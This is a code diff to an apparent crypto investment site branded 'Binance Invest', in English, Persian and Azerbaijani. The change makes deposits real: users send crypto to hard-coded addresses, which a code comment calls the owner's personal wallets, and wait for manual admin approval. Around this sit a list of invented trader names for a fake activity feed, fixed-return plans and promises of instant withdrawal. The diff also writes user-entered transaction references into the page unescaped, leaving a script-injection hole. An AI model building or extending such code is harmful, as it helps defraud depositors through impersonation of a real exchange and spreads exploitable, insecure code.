@@ -151,7 +151,45 @@ header{height:72px;position:sticky;top:0;z-index:50;background:#05070be8;backdro
   <div class="title"><h2 data-t="portfolio">Portfolio</h2><button id="portfolioAuthBtn" class="btn gold" onclick="openAuth('login')" data-t="login">Sign In</button></div>
   <div class="cards"><div class="card stat"><span class="muted" data-t="balance">Balance</span><b id="balance">$0.00</b></div><div class="card stat"><span class="muted" data-t="invested">Invested</span><b id="invested">$0.00</b></div><div class="card stat"><span class="muted" data-t="profitTotal">Total profit</span><b class="green" id="profitTotal">$0.00</b></div><div class="card stat"><span class="muted" data-t="level">Account level</span><b id="level">Basic</b></div></div>
   <div class="two">
-    <div class="card"><h2 data-t="deposit">Deposit</h2><p class="muted" data-t="depositDesc">Add simulated balance instantly.</p><input id="depositAmount" type="number" placeholder="100"><button class="btn gold" style="width:100%;margin-top:10px" onclick="deposit()" data-t="add">Add Balance</button></div>
+    <div class="card">
+      <h2 data-t="deposit">Deposit</h2>
+      <p class="muted" data-t="depositDesc">Add balance securely via wallet or gateway.</p>
+      
+      <!-- فرم جدید واریز وجه -->
+      <div style="margin-top: 15px;">
+          <label style="display:block; color:#aeb7c3; font-size:12px; margin-bottom:5px;">مبلغ (دلار / USD):</label>
+          <input type="number" id="deposit-amount" placeholder="مثلا 100" style="width:100%; padding:8px; background:#2b313a; border:1px solid #474d57; color:#fff; border-radius:4px; margin-bottom:10px;">
+      </div>
+
+      <div style="margin-bottom: 10px;">
+          <label style="display:block; color:#aeb7c3; font-size:12px; margin-bottom:5px;">انتخاب روش پرداخت:</label>
+          <select id="payment-method" onchange="togglePaymentDetails()" style="width:100%; padding:8px; background:#2b313a; border:1px solid #474d57; color:#fff; border-radius:4px;">
+              <option value="wallet">پرداخت مستقیم به ولت شما (ارز دیجیتال)</option>
+              <option value="paymentio">درگاه پرداخت Payment.io</option>
+              <option value="leemon">کارت به کارت / درگاه Leemon</option>
+          </select>
+      </div>
+
+      <div id="crypto-options-container" style="margin-bottom: 10px;">
+          <label style="display:block; color:#aeb7c3; font-size:12px; margin-bottom:5px;">انتخاب نوع ارز و شبکه:</label>
+          <select id="crypto-currency" onchange="togglePaymentDetails()" style="width:100%; padding:8px; background:#2b313a; border:1px solid #474d57; color:#fff; border-radius:4px;">
+              <option value="trx_usdt_trc20">TRX / Tether (TRC20)</option>
+              <option value="bnb_usdt_bep20">BNB / Tether (BEP20)</option>
+              <option value="eth_usdt_erc20">Ethereum / Tether (ERC20)</option>
+              <option value="btc">Bitcoin (BTC)</option>
+          </select>
+      </div>
+
+      <div id="payment-info-box" style="background:#121318; padding:10px; border-radius:4px; margin-bottom:10px; font-size:11px; border:1px dashed #f0b90b; word-break:break-all;"></div>
+
+      <div style="margin-bottom: 15px;">
+          <label style="display:block; color:#aeb7c3; font-size:12px; margin-bottom:5px;">شماره پیگیری / هش تراکنش (TXID):</label>
+          <input type="text" id="tx-ref" placeholder="کد پیگیری یا هش واریز را وارد کنید" style="width:100%; padding:8px; background:#2b313a; border:1px solid #474d57; color:#fff; border-radius:4px;">
+      </div>
+
+      <button class="btn gold" style="width:100%;" onclick="submitDepositRequest()">ثبت درخواست واریز و انتظار تایید</button>
+    </div>
+
     <div class="card"><h2 data-t="withdraw">Withdraw</h2><p class="muted" data-t="withdrawDesc">Request withdrawal instantly.</p><input id="withdrawAmount" type="number" placeholder="50"><button class="btn" style="width:100%;margin-top:10px" onclick="withdraw()" data-t="request">Request Withdrawal</button></div>
   </div>
 </section>
@@ -204,7 +242,7 @@ brand:"Binance Invest",login:"Sign In",register:"Create Account",logout:"Logout"
 hero:"Build your future with intelligent investing.",heroDesc:"Explore digital assets, investment plans and portfolio tools in one premium interface.",exploreInvest:"Explore Investments",exploreMarkets:"Explore Markets",
 users:"Platform users",tracked:"Assets tracked",assets:"Digital assets",live:"Live markets",uptime:"Platform uptime",top:"Top Markets",viewAll:"View all",featured:"Featured Investments",
 plans:"Investment Plans",illustrative:"Illustrative returns",calculator:"Investment Calculator",amount:"Amount",plan:"Plan",estimated:"Estimated value",
-balance:"Balance",invested:"Invested",profitTotal:"Total profit",level:"Account level",deposit:"Deposit",depositDesc:"Add simulated balance instantly.",add:"Add Balance",withdraw:"Withdraw",withdrawDesc:"Request withdrawal instantly.",request:"Request Withdrawal",
+balance:"Balance",invested:"Invested",profitTotal:"Total profit",level:"Account level",deposit:"Deposit",depositDesc:"Add balance securely via wallet or gateway.",add:"Add Balance",withdraw:"Withdraw",withdrawDesc:"Request withdrawal instantly.",request:"Request Withdrawal",
 clear:"Clear history",copy:"Copy code",account:"Account",username:"Username",email:"Email",fullname:"Full Name",phone:"Phone",save:"Save Profile",security:"Security",password:"Password",continue:"Continue",local:"Account data is stored securely in Supabase database.",
 eyebrowText:"PREMIUM DIGITAL ASSET PLATFORM",footerTitle:"Why Binance Invest?",footerDesc:"We provide professional-grade reliability with ultra-low latency trading execution, intelligent portfolio tools, and advanced security protocols to keep your digital assets growing securely.",footerCopy:"© 2026 Binance Invest Global. All rights reserved.",
 thAsset:"Asset",thPrice:"Price",th24h:"24h",thCap:"Market Cap",thVol:"Volume",
@@ -221,7 +259,7 @@ brand:"بایننس اینوست",login:"ورود",register:"ساخت حساب",
 hero:"آینده خود را هوشمندانه بسازید.",heroDesc:"رمزارزها، پلن‌های سرمایه‌گذاری و ابزارهای مدیریت سبد را در یک محیط حرفه‌ای بررسی کنید.",exploreInvest:"مشاهده سرمایه‌گذاری‌ها",exploreMarkets:"مشاهده بازارها",
 users:"کاربران پلتفرم",tracked:"دارایی‌های تحت پوشش",assets:"رمزارزها",live:"بازار زنده",uptime:"آپ‌تایم",top:"بازارهای برتر",viewAll:"مشاهده همه",featured:"سرمایه‌گذاری‌های ویژه",
 plans:"پلن‌های سرمایه‌گذاری",illustrative:"بازدهی نمایشی",calculator:"محاسبه‌گر سرمایه‌گذاری",amount:"مبلغ",plan:"پلن",estimated:"ارزش تخمینی",
-balance:"موجودی",invested:"سرمایه‌گذاری‌شده",profitTotal:"سود کل",level:"سطح حساب",deposit:"واریز",depositDesc:"افزایشی آنی موجودی.",add:"افزودن موجودی",withdraw:"برداشت",withdrawDesc:"ثبت درخواست برداشتی آنی.",request:"درخواست برداشت",
+balance:"موجودی",invested:"سرمایه‌گذاری‌شده",profitTotal:"سود کل",level:"سطح حساب",deposit:"واریز",depositDesc:"شارژ امن حساب از طریق ولت یا درگاه.",add:"افزودن موجودی",withdraw:"برداشت",withdrawDesc:"ثبت درخواست برداشتی آنی.",request:"درخواست برداشت",
 clear:"پاک کردن تاریخچه",copy:"کپی کد",account:"حساب",username:"نام کاربری",email:"ایمیل",fullname:"نام و نام خانوادگی",phone:"تلفن",save:"ذخیره پروفایل",security:"امنیت",password:"رمز عبور",continue:"ادامه",local:"اطلاعات حساب شما به صورت امن در دیتابیس Supabase ذخیره می‌شود.",
 eyebrowText:"پلتفرم پیشرفته دارایی دیجیتال",footerTitle:"چرا بایننس اینوست؟",footerDesc:"ما قابلیت اطمینان در سطح حرفه‌ای با سرعت بالا، ابزارهای هوشمند سبد سرمایه و پروتکل‌های امنیتی پیشرفته را برای رشد امن دارایی‌های شما فراهم می‌کنیم.",footerCopy:"© ۲۰۲۶ بایننس اینوست. تمامی حقوق محفوظ است.",
 thAsset:"دارایی",thPrice:"قیمت",th24h:"۲۴ ساعته",thCap:"ارزش بازار",thVol:"حجم معاملات",
@@ -238,7 +276,7 @@ brand:"Binance İnvest",login:"Daxil ol",register:"Hesab yarat",logout:"Çıxı�
 hero:"Gələcəyinizi ağıllı investisiya ilə qurun.",heroDesc:"Kriptovalyutaları və investisiya alətlərini peşəkar interfeysdə kəşf edin.",exploreInvest:"İnvestisiyalara bax",exploreMarkets:"Bazara bax",
 users:"Platforma istifadəçiləri",tracked:"İzlənən aktivlər",assets:"Rəqəmsal aktivlər",live:"Canlı bazarlar",uptime:"Platforma işləkliyi",top:"Ən yaxşı bazarlar",viewAll:"Hamısına bax",featured:"Seçilmiş investisiyalar",
 plans:"İnvestisiya planları",illustrative:"Nümunə gəlir",calculator:"İnvestisiya kalkulyatoru",amount:"Məbləğ",plan:"Plan",estimated:"Təxmini dəyər",
-balance:"Balans",invested:"İnvestisiya",profitTotal:"Ümumi gəlir",level:"Hesab səviyyəsi",deposit:"Depozit",depositDesc:"Ani balans artırma.",add:"Balans əlavə et",withdraw:"Çıxarış",withdrawDesc:"Ani çıxarış sorğusu.",request:"Sorğu göndər",
+balance:"Balans",invested:"İnvestisiya",profitTotal:"Ümumi gəlir",level:"Hesab səviyyəsi",deposit:"Depozit",depositDesc:"Balansı cüzdan və ya şlüz vasitəsilə artırın.",add:"Balans əlavə et",withdraw:"Çıxarış",withdrawDesc:"Ani çıxarış sorğusu.",request:"Sorğu göndər",
 clear:"Tarixçəni sil",copy:"Kodu kopyala",account:"Hesab",username:"İstifadəçi adı",email:"E-poçt",fullname:"Ad və Soyad",phone:"Telefon",save:"Profili saxla",security:"Təhlükəsizlik",password:"Şifrə",continue:"Davam et",local:"Hesab məlumatlarınız Supabase bazasında təhlükəsiz saxlanılır.",
 eyebrowText:"PREMİUM RƏqəmsal AKTİV PLATFORMASI",footerTitle:"Niyə Binance İnvest?",footerDesc:"Aktivlərinizin təhlükəsiz böyüməsi üçün peşəkar səviyyədə etibarlılıq və ağıllı portfel alətləri təqdim edirik.",footerCopy:"© 2026 Binance Invest Global. Bütün hüquqlar qorunur.",
 thAsset:"Aktiv",thPrice:"Qiymət",th24h:"24s",thCap:"Bazar Dəyəri",thVol:"Həcm",
@@ -260,6 +298,77 @@ const plans=[["Starter",10,100,2.5,30],["Growth",110,1000,3.5,60],["Premium",110
 
 let live={}, stars=JSON.parse(localStorage.getItem("bi_stars")||"[]"), currentUser=null, authMode="login";
 let tempRegData=null, generatedEmailCode="";
+
+// آدرس ولت‌های شخصی شما
+const WALLETS = {
+    trx_usdt_trc20: "TDeaeRTD4Ebj8FDhe4fZK3mGBNWnWajyzG",
+    bnb_usdt_bep20: "0x7a858984dAE29B02d148f254eCa04aeB6c51f8fD",
+    eth_usdt_erc20: "0x7a858984dAE29B02d148f254eCa04aeB6c51f8fD",
+    btc: "bc1p7vndl752t2tv3sah3k3wagzkcd445496s4fr298ustpe4maw4yns7fqv0k"
+};
+
+function togglePaymentDetails() {
+    const method = document.getElementById('payment-method').value;
+    const cryptoContainer = document.getElementById('crypto-options-container');
+    const infoBox = document.getElementById('payment-info-box');
+
+    if (method === 'wallet') {
+        cryptoContainer.style.display = 'block';
+        const selectedCrypto = document.getElementById('crypto-currency').value;
+        const address = WALLETS[selectedCrypto];
+        
+        infoBox.innerHTML = `<b>آدرس ولت شما برای این شبکه:</b><br><span style="color:#0ecb81; user-select: all;">${address}</span><br><small style="color:#aaa;">لطفاً مبلغ را به این آدرس واریز کرده و سپس هش تراکنش را وارد کنید.</small>`;
+    } else {
+        cryptoContainer.style.display = 'none';
+        if (method === 'paymentio') {
+            infoBox.innerHTML = `درگاه پرداخت <b>Payment.io</b> انتخاب شد. پس از ثبت، منتظر تایید بمانید.`;
+        } else if (method === 'leemon') {
+            infoBox.innerHTML = `درگاه کارت به کارت <b>Leemon</b> انتخاب شد. پس از واریز، کد پیگیری را ثبت کنید.`;
+        }
+    }
+}
+
+async function submitDepositRequest() {
+    const amount = document.getElementById('deposit-amount').value;
+    const method = document.getElementById('payment-method').value;
+    const cryptoType = document.getElementById('crypto-currency').value;
+    const gatewayRef = document.getElementById('tx-ref').value;
+    
+    if(!currentUser) return openAuth("login");
+
+    if (!amount || amount <= 0) {
+        alert('لطفا مبلغ معتبری وارد کنید.');
+        return;
+    }
+
+    if (!gatewayRef) {
+        alert('لطفا شماره پیگیری یا هش تراکنش را وارد کنید.');
+        return;
+    }
+
+    let paymentDetailsInfo = method === 'wallet' ? `[Wallet - ${cryptoType}] ${gatewayRef}` : `[${method.toUpperCase()}] ${gatewayRef}`;
+
+    // ثبت درخواست در جدول transactions با وضعیت Pending برای تایید توسط ادمین
+    const { error } = await supabaseClient.from('transactions').insert([
+        {
+            username: currentUser.username,
+            type: 'Deposit (Pending)',
+            amount: Number(amount),
+            status: 'pending',
+            gateway_ref: paymentDetailsInfo,
+            date: new Date().toLocaleString()
+        }
+    ]);
+
+    if (error) {
+        alert('خطا در ثبت درخواست: ' + error.message);
+    } else {
+        alert('درخواست واریز شما با موفقیت ثبت شد و پس از بررسی و تایید شما در پنل ادمین، به موجودی اضافه خواهد شد.');
+        document.getElementById('deposit-amount').value = '';
+        document.getElementById('tx-ref').value = '';
+        loadTransactions();
+    }
+}
 
 const fakeNames = ["Ali R.", "Sarah M.", "David K.", "Mohammad J.", "Elena T.", "Reza S.", "Alex B.", "Maria P.", "Aykhan M.", "Zahra F."];
 const fakeCoins = ["USDT", "BTC", "ETH", "BNB", "TRX", "SOL"];
@@ -315,7 +424,7 @@ function page(id,b){
   if(target) target.classList.add("active");
   document.querySelectorAll(".nav button").forEach(x=>x.classList.remove("active"));
   if(b)b.classList.add("active");
-  if(id==="portfolio") updatePortfolio();
+  if(id==="portfolio") { updatePortfolio(); togglePaymentDetails(); }
   if(id==="transactions") loadTransactions();
   scrollTo(0,0);
 }
@@ -344,7 +453,6 @@ async function submitAuth(){
     if(!email.includes("@")) return toast("Please enter a valid email");
     if(p.length<6) return toast("Password must be at least 6 characters");
     
-    // بررسی وجود نام کاربری در Supabase
     let { data: existing, error: errCheck } = await supabaseClient.from('users').select('*').or(`username.eq.${u},email.eq.${email}`);
     if(existing && existing.length > 0) return toast("Username or email already taken!");
 
@@ -357,7 +465,6 @@ async function submitAuth(){
     let enteredCode = authEmailCode.value.trim();
     if(enteredCode !== generatedEmailCode) return toast("Invalid code!");
     
-    // ثبت مستقیم کاربر جدید در جدول users در Supabase
     let { data, error } = await supabaseClient.from('users').insert([tempRegData]).select();
     if(error){
       console.error(error);
@@ -429,17 +536,6 @@ async function saveTx(type, amount, status){
     status: status,
     date: new Date().toLocaleString()
   }]);
-}
-
-async function deposit(){
-  let a = +document.getElementById("depositAmount").value;
-  if(!currentUser) return openAuth("login");
-  if(a <= 0) return toast("Enter a valid amount");
-  
-  currentUser.balance += a;
-  await saveUserData();
-  await saveTx('Deposit', a, 'Completed');
-  updatePortfolio(); loadTransactions(); toast("Deposit successful!");
 }
 
 async function withdraw(){
@@ -548,7 +644,7 @@ async function loadTransactions(){
   if(!currentUser){ txList.innerHTML = '<p class="muted">Please sign in to view your transactions.</p>'; return; }
   let { data: txs, error } = await supabaseClient.from('transactions').select('*').eq('username', currentUser.username).order('id', {ascending: false});
   if(error || !txs || txs.length === 0){ txList.innerHTML = '<p class="muted">No transactions found.</p>'; return; }
-  txList.innerHTML = txs.map(x=>`<div class="row"><span><b>${x.type}</b><br><small class="muted">${x.date}</small></span><b class="${x.type.includes("Withdrawal")?"red":"green"}">${x.amount?"$"+Number(x.amount).toLocaleString():"—"}</b></div>`).join("");
+  txList.innerHTML = txs.map(x=>`<div class="row"><span><b>${x.type}</b> <small style="color:var(--gold)">[${x.status||'Completed'}]</small><br><small class="muted">${x.date || ''} ${x.gateway_ref ? ' | ' + x.gateway_ref : ''}</small></span><b class="${x.type.includes("Withdrawal")?"red":"green"}">${x.amount?"$"+Number(x.amount).toLocaleString():"—"}</b></div>`).join("");
 }
 
 async function clearTx(){
@@ -597,7 +693,7 @@ if(savedUser){
   try{ currentUser = JSON.parse(savedUser); }catch(e){ currentUser = null; }
 }
 
-renderPlans(); renderTop(); renderTable(); prices(); loadProfile(); updatePortfolio(); updateHeaderAuthUI(); loadTransactions();
+renderPlans(); renderTop(); renderTable(); prices(); loadProfile(); updatePortfolio(); updateHeaderAuthUI(); loadTransactions(); togglePaymentDetails();
 setInterval(prices, 30000);
 document.getElementById("lang").value = localStorage.getItem("bi_lang") || "en";
 setLang(document.getElementById("lang").value);
